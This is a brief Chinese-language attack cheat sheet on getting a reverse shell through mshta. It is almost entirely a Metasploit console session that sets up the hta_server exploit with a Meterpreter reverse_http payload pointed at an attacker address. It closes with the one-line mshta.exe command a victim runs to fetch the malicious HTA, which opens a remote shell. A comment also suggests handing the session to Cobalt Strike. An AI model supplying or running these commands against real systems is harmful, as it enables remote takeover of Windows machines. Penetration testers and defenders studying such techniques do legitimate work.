# Mshta 反弹 shell

```bash
msf5 > use exploit/windows/misc/hta_server

# 设置反向 HTTP 回连
msf5 exploit(windows/misc/hta_server) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http

msf5 exploit(windows/misc/hta_server) > set lhost 10.20.24.244 #这里可以直接给cs上线 注意不要和本地端口重复,msf这里有bug会报错，无碍。
lhost => 10.20.24.244

msf5 exploit(windows/misc/hta_server) > set lport 6666
lport => 6666

msf5 exploit(windows/misc/hta_server) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.20.24.244:6666

msf5 exploit(windows/misc/hta_server) > [*] Using URL: http://0.0.0.0:8080/n8Zw0EKX.hta
[*] Local IP: http://10.20.24.244:8080/n8Zw0EKX.hta
[*] Server started.
```

目标powershell 执行payload

```bash
mshta.exe http://10.20.24.244:8080/n8Zw0EKX.hta
```
